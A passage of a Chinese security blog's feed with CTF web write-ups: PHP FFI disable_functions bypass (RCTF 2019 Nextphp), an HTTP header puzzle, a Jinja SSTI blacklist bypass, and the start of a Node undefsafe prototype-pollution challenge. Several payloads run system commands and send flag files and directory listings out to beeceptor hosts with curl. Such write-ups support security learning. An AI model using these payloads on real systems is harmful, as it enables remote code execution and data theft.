punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个preload文件就是拿来绕过disable_function的，主要是利用<a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload">opcache.preload</a></p><blockquote><p><a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload">opcache.preload</a>是 <strong>PHP7.4</strong> 中新加入的功能。如果设置了<a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload">opcache.preload</a> ，那么在所有Web应用程序运行之前，服务会先将设定的<strong>preload</strong>文件加载进内存中，使这些<strong>preload</strong>文件中的内容对之后的请求均可用。更多细节可以阅读：<a href="https://wiki.php.net/rfc/preload">https://wiki.php.net/rfc/preload</a></p></blockquote><p>最后有一段话</p><blockquote><p>In conjunction with ext/FFI (dangerous extension), we may allow FFI functionality only in preloaded PHP files, but not in regular ones</p><p>允许在<strong>preload</strong>文件中使用<strong>FFI</strong>拓展，但<strong>FFI</strong>是一个危险的拓展</p></blockquote><p>这题开了FFI，所以可以利用<a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// create FFI object, loading libc and exporting function printf()</span><span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span>    <span class="token string double-quoted-string">"int printf(const char *format, ...);"</span><span class="token punctuation">,</span> <span class="token comment">// this is regular C declaration</span>    <span class="token string double-quoted-string">"libc.so.6"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// call C printf()</span><span class="token variable">$ffi</span><span class="token operator">-></span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hello %s!\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string single-quoted-string">'ret'</span> <span class="token operator">=></span> <span class="token constant">null</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'func'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'FFI::cdef'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'arg'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'int system(char *command);'</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"run&lt;br>"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span> <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span> <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"__construct&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 即payload</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里的exp代码中删除了原有的<code>__serialize</code> 、<code>__unserialize</code>两个函数，这是因为在反序列化时会触发<code>__unserialize</code>函数，这一特性是在PHP7.4中新加入的，具体可参考：<a href="https://wiki.php.net/rfc/custom_object_serialization">https://wiki.php.net/rfc/custom_object_serialization</a> 。</p></blockquote><p>payload:</p><p>思路就是反序列化的时候会调用<code>__unserialize</code>，然后执行<code>run()</code>函数，就构造出了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ret'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token keyword type-declaration">int</span> <span class="token function">system</span><span class="token punctuation">(</span>char <span class="token operator">*</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这就和RFC的POC如出一辙了，使得<code>$data[&#39;ret&#39;]-&gt;system();</code>可以绕过限制执行系统命令。</p><pre class="line-numbers language-none"><code class="language-none">?a&#x3D;unserialize(base64_decode(上面生成的payload))-&gt;__serialize()[&#39;ret&#39;]-&gt;system(系统命令);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?a&#x3D;unserialize(base64_decode(QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319))-&gt;__serialize()[&#39;ret&#39;]-&gt;system(&quot;curl -d @&#x2F;flag https:&#x2F;&#x2F;asd5f4asd.free.beeceptor.com&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909213419249.png"></p><p>也因为这题，蚁剑出了个FFI一键利用插件，蚁剑nb！</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">RCTF2019Web题解之nextphp</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> disable_function </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[BSidesCF 2020]Hurdles</title>
      <link href="/p/3350441754.html"/>
      <url>/p/3350441754.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[HTTP|postman|闯关]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909141019371.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909141034742.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909141051660.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909141442114.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909141612431.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142129632.png"></p><p>basically是提示</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142222787.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142254870.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142403774.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142418718.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142616255.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142652919.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142713636.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142832234.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142914894.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142928944.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909143033132.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909143055209.png"></p><p>用<code>Accept-Language，</code>查询<a href="https://blog.csdn.net/u014549283/article/details/81742104">语言代码缩写表大全</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909143158882.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909143214510.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909143232312.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909143255399.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[GWCTF 2019]你的名字</title>
      <link href="/p/4169927949.html"/>
      <url>/p/4169927949.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/image-20210909103234948.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>原本以为是sql注入，没想到是ssti</p><p>而且虽然是python后端，但加了个php模式的报错和index.php路由</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/image-20210909110224214.png"></p><p><code>&#123;&#123;</code>被过滤，用<code>&#123;% if ... %&#125;&#123;% endif %&#125;</code>代替，用<code>os.popen</code>+<code>curl</code>来带出数据</p><p>有黑名单过滤，非递归模式，存在逻辑错误</p><p>比如输入<code>imporgetattrt</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/image-20210909124515989.png"></p><p>所以需要找到最后一个。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">from</span> time <span class="token keyword">import</span> sleepurl <span class="token operator">=</span> <span class="token string">"http://c21719f3-6650-4fee-b5de-7113e95abbb1.node4.buuoj.cn:81/"</span>blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'subclasses'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token string">'args'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'if'</span><span class="token punctuation">,</span> <span class="token string">'for'</span><span class="token punctuation">,</span>             <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'execfile'</span><span class="token punctuation">,</span> <span class="token string">'from_pyfile'</span><span class="token punctuation">,</span> <span class="token string">'local'</span><span class="token punctuation">,</span>             <span class="token string">'self'</span><span class="token punctuation">,</span> <span class="token string">'item'</span><span class="token punctuation">,</span> <span class="token string">'getitem'</span><span class="token punctuation">,</span> <span class="token string">'getattribute'</span><span class="token punctuation">,</span> <span class="token string">'func_globals'</span><span class="token punctuation">,</span> <span class="token string">'config'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">find_unused_word</span><span class="token punctuation">(</span>words<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    used_word <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"[a-zA-Z]+"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> words <span class="token keyword">if</span> i <span class="token keyword">not</span> <span class="token keyword">in</span> used_word<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">replace_fuzz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"&#123;% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl https://sfg56dsf.free.beeceptor.com/?i=`ls / |base64`') %&#125;1&#123;% endif %&#125;"</span>    unused_word <span class="token operator">=</span> find_unused_word<span class="token punctuation">(</span>blacklist<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>unused_word<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> unused_word<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"name"</span><span class="token punctuation">:</span> i        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"hello !"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"cla"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">"ss"</span>            <span class="token punctuation">&#125;</span>            sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"class"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] find </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check_fuzz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"name"</span><span class="token punctuation">:</span> i        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>i<span class="token punctuation">)</span>        <span class="token keyword">if</span> i <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    replace_fuzz<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">&#123;% iconfigf &#39;&#39;.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(&#39;curl https:&#x2F;&#x2F;sfg56dsf.free.beeceptor.com&#x2F;?i&#x3D;&#96;ls &#x2F; |base64&#96;&#39;) %&#125;1&#123;% endiconfigf %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#123;% iconfigf &#39;&#39;.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(&#39;curl https:&#x2F;&#x2F;sfg56dsf.free.beeceptor.com&#x2F;?i&#x3D;&#96;cat &#x2F;flag_1s_Hera |base64&#96;&#39;) %&#125;1&#123;% endiconfigf %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[网鼎杯 2020 青龙组]notes</title>
      <link href="/p/285081490.html"/>
      <url>/p/285081490.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[undefsafe|原型链|<code>__proto__</code>|CVE-2019-10795]</p><p>给了源码</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">var express &#x3D; require(&#39;express&#39;);var path &#x3D; require(&#39;path&#39;);const undefsafe &#x3D; require(&#39;undefsafe&#39;);const &#123; exec &#125; &#x3D; require(&#39;child_process&#39;);var app &#x3D; express();class Notes &#123;    constructor() &#123;        this.owner &#x3D; &quot;whoknows&quot;;        this.num &#x3D; 0;        this.note_list &#x3D; &#123;&#125;;    &#125;    write_note(author, raw_note) &#123;        this.note_list[(this.num++).toString()] &#x3D; &#123;&quot;author&quot;: author,&quot;raw_note&quot;:raw_note&#125;;    &#125;    get_note(id) &#123;        var r &#x3D; &#123;&#125;        undefsafe(r, id, undefsafe(this.note_list, id));        return r;    &#125;    edit_note(id, author, raw) &#123;        undefsafe(this.note_list, id + &#39;.author&#39;, author);        undefsafe(this.note_list, id + &#39;.raw_note&#39;, raw);    &#125;    get_all_notes() &#123;        return this.note_list;    &#125;    remove_note(id) &#123;        delete this.note_list[id];    &#125;&#125;var notes &#x3D; new Notes();notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#39;s first note&quot;);app.set(&#39;views&#39;, path.join(__dirname, &#39;views&#39;));app.set(&#39;view engine&#39;, &#39;pug&#39;);app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(express.static(path.join(__dirname, &#39;public&#39;)));app.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;  res.render(&#39;index&#39;, &#123; title: &#39;Notebook&#39; &#125;);&#125;);app.route(&#39;&#x2F;add_note&#39;)    .get(function(req, res) &#123;        res.render(&#39;mess&#39;, &#123;message: &#39;please use POST to add a note&#39;&#125;);    &#125;)    .post(function(req, res) &#123;        let author &#x3D; req.body.author;        let raw &#x3D; req.body.raw;        if (author &amp;&amp; raw) &#123;            notes.write_note(author, raw);            res.render(&#39;mess&#39;, &#123;message: &quot;add note sucess&quot;&#125;);        &#125; else &#123;            res.render(&#39;mess&#39;, &#123;message: &quot;did not add note&quot;&#125;);        &#125;    &#125;)app.route(&#39;&#x2F;edit_note&#39;)    .get(function(req, res) &#123;        res.render(&#39;mess&#39;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);    &#125;)    .post(function(req, res) &#123;        let id &#x3D; req.body.id;        let author &#x3D; req.body.author;        let enote &#x3D; req.body.raw;        if (id &amp;&amp; author &amp;&amp; enote) &#123;            notes.edit_note(id, author, enote);            res.render(&#39;mess&#39;, &#123;message: &quot;edit note sucess&quot;&#125;);        &#125; else &#123;            res.render(&#39;mess&#39;, &#123;message: &quot;edit note failed&quot;&#125;);        &#125;    &#125;)app.route(&#39;&#x2F;delete_note&#39;)    .get(function(req, res) &#123;        res.render(&#39;mess&#39;, &#123;message: &quot;please use POST to delete a note&quot;&#125;);    &#125;)    .post(function(req, res) &#123;        let id &#x3D; req.body.id;        if (id) &#123;            notes.remove_note(id);            res.render(&#39;mess&#39;, &#123;message: &quot;delete done&quot;&#125;);        &#125; else &#123;            res.render(&#39;mess&#39;, &#123;message: &quot;delete failed&quot;&#125;);        &#125;    &#125;)app.route(&#39;&#x2F;notes&#39;)    .get(function(req, res) &#123;        let q &#x3D; req.query.q;        let a_note;        if (typeof(q) &#x3D;&#x3D;&#x3D; &quot;undefined&quot;) &#123;            a_note &#x3D; notes.get_all_notes();        &#125; else &#123;            a_note &#x3D; notes.get_note(q);        &#125;        res.render(&#39;note&#39;, &#123;list: a_note&#125;);    &#125;)app.route(&#39;&#x2F;status&#39;)    .get(function(req, res) &#123;        let commands &#x3D; &#123;            &quot;script-1&quot;: &quot;uptime&quot;,            &quot;script-2&quot;: &quot;free -m&quot;        &#125;;        for (let index in commands) &#123;            exec(commands[index], &#123;shell:&#39;&#x2F;bin&#x2F;bash&#39;&#125;, (err, stdout, stderr) &#x3D;&gt; &#123;                if (err) &#123;                    return;                &#125;                console.log(&#96;stdout: $&#123;stdout&#125;&#96;);            &#125;);        &#125;        res.send(&#39;OK&#39;);        res.end();    &#125;)app.use(function(req, res, next) &#123;  res.status(404).send(&#39;Sorry cant find that!&#39;);&#125;);app.use(function(err, req, res, next) &#123;  console.error(err.stack);  res.status(500).send(&#39;Something broke!&#39;);&#125;);const port &#x3D; 8080;app.listen(port, () &#x3D;&gt; console.log(&#96;Example app listening at http:&#x2F;&#x2F;localhost:$&#123;port&#125;&#96;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>undefsafe作用</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> object <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a<span class="token operator">:</span> <span class="token punctuation">&#123;</span>b<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token function">undefsafe</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> <span class="token string">'a.b.0'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span 